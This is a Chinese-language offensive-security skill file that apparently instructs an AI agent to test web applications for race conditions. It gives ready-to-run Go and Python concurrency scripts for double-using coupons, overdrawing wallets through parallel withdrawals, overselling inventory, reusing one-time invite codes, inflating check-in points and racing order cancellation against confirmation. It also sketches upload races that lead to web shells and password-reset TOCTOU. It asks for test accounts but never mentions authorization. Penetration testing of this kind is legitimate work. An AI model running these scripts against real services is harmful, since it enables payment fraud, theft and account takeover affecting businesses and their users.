---
name: race-condition
description: >
  竞态条件 / TOCTOU 深度测试。覆盖优惠券加倍使用、库存超卖、支付金额篡改、
  提现并发、邀请码无限复用、签到积分翻倍、文件上传竞态、密码重置TOCTOU、
  状态流转竞态。含 Go/Python 并发脚本模板，按场景分类（支付/库存/优惠券/注册）。
metadata:
  tags: "race,toctou,concurrency,double-spend,business-logic,coupon,inventory,payment"
  category: "offensive-security"
---

# Race Condition — 竞态条件深度测试

> 竞态条件是中高危漏洞的高频出产地。JS 分析帮你找到接口和参数，竞态测试帮你发现时序上的保护缺失。
>
> **你的优势**：可以瞬间写并发脚本，测试 50/100 路并发——这是人类调试并发代码最痛苦的部分。

---

## ⛔ 强制规则

```
规则 1: 只在测试账号上做竞态测试（禁止用真实用户的优惠券/余额）
规则 2: 每次测试只发 5-50 个并发（不要打挂服务）
规则 3: 至少测试 3 轮（竞态可能不是 100% 重现）
规则 4: JS 分析阶段标记的所有优惠券/支付/提现/签到接口 → 必须测竞态
```

---

## 0. 竞态场景分类

按出现频率和漏洞价值排序：

| 优先级 | 场景 | 漏洞价值 | 测试难度 |
|--------|------|---------|---------|
| **P0** | 支付/提现并发 | 严重（直接经济损失） | 低 |
| **P0** | 优惠券/折扣码加倍 | 高危（可大规模薅羊毛） | 低 |
| **P1** | 库存超卖 | 高危（业务流程破坏） | 低 |
| **P1** | 邀请码/注册码无限复用 | 中危（注册限制绕过） | 低 |
| **P1** | 签到/积分并发翻倍 | 中危（虚拟资产膨胀） | 低 |
| **P2** | 密码重置 TOCTOU | 高危（账户接管） | 中 |
| **P2** | 状态流转竞态 | 中危（业务逻辑绕过） | 中 |
| **P2** | 文件上传竞态 | 高危（Web Shell） | 高 |

---

## 1. 优惠券/折扣码加倍使用（最高频 P0）

**攻击逻辑**：同时发 N 个"使用优惠券"请求，如果后端没有原子性校验→一张优惠券可用多次。

### 检测信号
```
□ API 中有 couponCode / discountCode / promoCode 参数
□ 优惠券有使用次数限制（ONETIME / LIMIT_PER_USER）
□ API 响应返回了优惠券状态（used / available）
```

### Go 并发脚本（推荐，轻量高效）

```go
// coupon_race.go — 优惠券并发使用测试
package main

import (
    "bytes"
    "fmt"
    "net/http"
    "sync"
)

func main() {
    targetURL := "https://target.com/api/coupon/use"
    token := "Bearer eyJ..."
    couponCode := "TEST_COUPON_123" // 用自己的测试优惠券
    concurrency := 20

    var wg sync.WaitGroup
    results := make(chan int, concurrency)

    for i := 0; i < concurrency; i++ {
        wg.Add(1)
        go func(idx int) {
            defer wg.Done()
            body := fmt.Sprintf(`{"couponCode":"%s","userId":10086}`, couponCode)
            req, _ := http.NewRequest("POST", targetURL, 
                bytes.NewBuffer([]byte(body)))
            req.Header.Set("Content-Type", "application/json")
            req.Header.Set("Authorization", token)
            
            resp, _ := http.DefaultClient.Do(req)
            results <- resp.StatusCode
        }(i)
    }

    wg.Wait()
    close(results)

    successCount := 0
    for code := range results {
        if code == 200 {
            successCount++
        }
    }
    fmt.Printf("并发: %d, 成功: %d\n", concurrency, successCount)
    if successCount > 1 {
        fmt.Printf("[漏洞!] 优惠券被使用了 %d 次\n", successCount)
    }
}
```

### Python 并发脚本

```python
# coupon_race.py
import asyncio, aiohttp, json

async def use_coupon(session, idx):
    body = {"couponCode": "TEST_COUPON_123", "userId": 10086}
    async with session.post(
        "https://target.com/api/coupon/use",
        json=body,
        headers={"Authorization": "Bearer eyJ..."}
    ) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [use_coupon(session, i) for i in range(20)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    successes = [r for r in results if isinstance(r, dict) and r.get("status") == "success"]
    print(f"并发: 20, 成功: {len(successes)}")
    if len(successes) > 1:
        print(f"[漏洞!] 优惠券被使用了 {len(successes)} 次")

asyncio.run(main())
```

---

## 2. 提现/转账并发（最高价值 P0）

**攻击逻辑**：余额=1000，同时发 2 个提现 1000 的请求。如果余额检查（SELECT）和扣款（UPDATE）不是原子操作 → 两个请求都通过余额检查 → 扣款后余额=-1000。

### 检测信号
```
□ API 中有 withdraw / transfer / redeem 操作
□ API 中有 balance / amount 参数
□ API 响应时间长（>200ms），说明有 SELECT→UPDATE 间隙
□ 响应中有 transactionId（说明是乐观锁，可能可绕过版本检查）
```

### 测试脚本

```go
// withdraw_race.go
func main() {
    // 前提: 账号余额=100
    targetURL := "https://target.com/api/wallet/withdraw"
    
    var wg sync.WaitGroup
    balances := make(chan int, 3)
    
    for i := 0; i < 3; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            body := `{"amount":100,"method":"bank"}`
            req, _ := http.NewRequest("POST", targetURL,
                bytes.NewBuffer([]byte(body)))
            req.Header.Set("Content-Type", "application/json")
            req.Header.Set("Authorization", "Bearer " + token)
            resp, _ := http.DefaultClient.Do(req)
            // 读响应体拿余额
            var result map[string]interface{}
            json.NewDecoder(resp.Body).Decode(&result)
            if bal, ok := result["balance"].(float64); ok {
                balances <- int(bal)
            }
            resp.Body.Close()
        }()
    }
    
    wg.Wait()
    close(balances)
    
    minBal := 999999
    for b := range balances {
        if b < minBal { minBal = b }
    }
    fmt.Printf("最终余额: %d\n", minBal)
    if minBal < 0 {
        fmt.Println("[严重漏洞] 余额为负！并发提现成功")
    }
    if minBal <= 0 {
        fmt.Println("[高危漏洞] 余额被提空，并发提现成功")
    }
}
```

---

## 3. 库存超卖（电商核心 P1）

**攻击逻辑**：库存=1，同时发 N 个购买请求→库存被减到负数→超卖。

```go
// inventory_race.go
func main() {
    targetURL := "https://target.com/api/order/create"
    productID := "SKU_LIMITED_1" // 库存=1 的商品
    
    var wg sync.WaitGroup
    var mu sync.Mutex
    orderIDs := []string{}
    
    for i := 0; i < 10; i++ {
        wg.Add(1)
        go func(idx int) {
            defer wg.Done()
            body := fmt.Sprintf(`{"productId":"%s","quantity":1}`, productID)
            req, _ := http.NewRequest("POST", targetURL,
                bytes.NewBuffer([]byte(body)))
            req.Header.Set("Content-Type", "application/json")
            req.Header.Set("Authorization", "Bearer " + token)
            resp, _ := http.DefaultClient.Do(req)
            
            var result map[string]interface{}
            json.NewDecoder(resp.Body).Decode(&result)
            resp.Body.Close()
            
            if result["status"] == "success" {
                mu.Lock()
                orderIDs = append(orderIDs, result["orderId"].(string))
                mu.Unlock()
            }
        }(i)
    }
    wg.Wait()
    
    fmt.Printf("创建的订单数: %d\n", len(orderIDs))
    if len(orderIDs) > 1 {
        fmt.Printf("[漏洞!] 库存超卖! 成功创建 %d 个订单\n", len(orderIDs))
    }
}
```

---

## 4. 状态流转竞态（P2）

**攻击逻辑**：订单 pending → 同时发"取消"和"确认收货" → 取消成功但钱已付。

```
常见状态流转竞态:
  pending → paid → shipped → received
  pending → cancelled
  
  并发攻击:
    同时发: POST /api/order/123/cancel
    同时发: POST /api/order/123/confirm
    目标: 取消后退款 + 订单仍然变成已完成
```

```go
// state_race.go
func main() {
    orderID := "ORDER_123"
    cancelURL := fmt.Sprintf("https://target.com/api/order/%s/cancel", orderID)
    confirmURL := fmt.Sprintf("https://target.com/api/order/%s/confirm", orderID)
    
    var wg sync.WaitGroup
    wg.Add(2)
    
    go func() {
        defer wg.Done()
        http.Post(cancelURL, "application/json", bytes.NewBuffer([]byte(`{}`)))
    }()
    
    go func() {
        defer wg.Done()
        http.Post(confirmURL, "application/json", bytes.NewBuffer([]byte(`{}`)))
    }()
    
    wg.Wait()
    
    // 检查最终状态
    resp, _ := http.Get(fmt.Sprintf("https://target.com/api/order/%s", orderID))
    var result map[string]interface{}
    json.NewDecoder(resp.Body).Decode(&result)
    fmt.Printf("最终订单状态: %s\n", result["status"])
    // 如果 status = completed 但钱退了 → 漏洞
}
```

---

## 5. 邀请码/注册码无限复用（P1）

```go
// invite_race.go
func main() {
    inviteCode := "INVITE_ONETIME_123"
    
    var wg sync.WaitGroup
    successCount := 0
    var mu sync.Mutex
    
    for i := 0; i < 10; i++ {
        wg.Add(1)
        go func(idx int) {
            defer wg.Done()
            body := fmt.Sprintf(`{"inviteCode":"%s","username":"user_%d","password":"test123"}`, inviteCode, idx)
            resp, _ := http.Post("https://target.com/api/register",
                "application/json", bytes.NewBuffer([]byte(body)))
            if resp.StatusCode == 200 {
                mu.Lock()
                successCount++
                mu.Unlock()
            }
        }(i)
    }
    wg.Wait()
    
    fmt.Printf("邀请码使用次数: %d\n", successCount)
    if successCount > 1 {
        fmt.Printf("[漏洞!] 一次性邀请码被使用了 %d 次\n", successCount)
    }
}
```

---

## 6. 签到/积分并发翻倍（P1）

```go
// checkin_race.go
func main() {
    // 前提: 每日签到一次，每次+10积分
    totalRuns := 10
    
    var wg sync.WaitGroup
    totalPoints := 0
    var mu sync.Mutex
    
    for i := 0; i < totalRuns; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            resp, _ := http.Post("https://target.com/api/checkin",
                "application/json", bytes.NewBuffer([]byte(`{}`)))
            var result map[string]interface{}
            json.NewDecoder(resp.Body).Decode(&result)
            resp.Body.Close()
            if pts, ok := result["points"].(float64); ok {
                mu.Lock()
                totalPoints += int(pts)
                mu.Unlock()
            }
        }()
    }
    wg.Wait()
    
    fmt.Printf("并发签到获得积分: %d\n", totalPoints)
    if totalPoints > 10 {
        fmt.Printf("[漏洞!] 并发签到获得 %d 积分 (预期最多10)\n", totalPoints)
    }
}
```

---

## 7. 文件上传竞态（P2 — 高危但触发条件苛刻）

**攻击逻辑**：上传恶意文件 → 在服务器检查/处理完成前 → 访问文件 → Web Shell。

```
条件:
  □ 上传的文件在检查期间可被直接访问
  □ 文件检查和处理不是同步的
  □ 文件存储路径可预测
```

---

## 8. 密码重置 TOCTOU（P2）

**攻击逻辑**：发送密码重置 → 用旧密码登录 → 在 token 失效窗口内→同时完成密码修改+登录。

```
条件:
  □ 密码重置的 token 在重置后没有被立即失效
  □ 旧 session 在密码修改后没有被 kill
```

---

## 9. 快速检测清单

```
□ 先标记——从 JS 分析中标记以下接口:
  □ 含 couponCode / discountCode / promoCode → 测优惠券竞态
  □ 含 withdraw / transfer / redeem → 测提现竞态
  □ 含 buy / order / purchase → 测库存竞态
  □ 含 invite / refer / register → 测注册码竞态
  □ 含 checkin / sign / point → 测积分竞态
  □ 含 cancel + confirm → 测状态流转竞态
  
□ 每个标记的接口 → 至少测 3 轮（并发数 10→20→50）

□ 判断标准:
  □ 并发 10 次，>1 次成功 → 漏洞存在
  □ 并发 20 次，>1 次成功 → 漏洞存在
  □ 并发 50 次，=0 次额外成功 → 大概率不存在

□ 记录:
  □ 每轮测试的并发数 + 成功数
  □ 保存响应体（用于证明多次操作成功）
```

---

## 10. 输出

```
findings/
├── race_results/
│   ├── coupon_race_result.md    # 优惠券竞态结果
│   ├── withdraw_race_result.md  # 提现竞态结果
│   └── ...
└── poc/
    ├── coupon_race.go           # Go 并发 PoC
    ├── coupon_race.py           # Python 并发 PoC
    └── ...
```

---

## 11. 注意事项

```
⚠️ 只在测试账号上操作！
⚠️ 并发数从 5 开始，逐步增加
⚠️ 竞态不是 100% 复现的——测 3 轮，只要 1 轮成功就是漏洞
⚠️ 如果服务挂了/响应变慢 → 立即停止（说明后端扛不住并发）
⚠️ 支付/提现类 → 用虚拟货币/测试环境，绝对不要用真实资金
```
